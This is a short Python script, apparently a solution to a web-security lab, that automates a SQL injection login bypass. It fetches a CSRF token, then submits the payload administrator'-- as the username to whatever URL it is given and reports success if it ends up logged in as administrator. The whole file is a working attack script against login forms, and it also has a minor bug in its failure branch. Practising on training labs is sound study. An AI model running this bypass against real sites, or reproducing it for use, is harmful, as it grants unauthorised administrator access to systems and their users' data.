import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def sqli_02(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": payload, "password": "doesnt_matter"}

    r = s.post(url, data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    else:
        False

if __name__ =="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    s = requests.Session()
    payload = "administrator'--"

    if sqli_02(s, url, payload):
        print("[+] SQLi successful. You are logged in as administrator.") 

    else:
        print("[-] SQLi unsuccessful.")                    

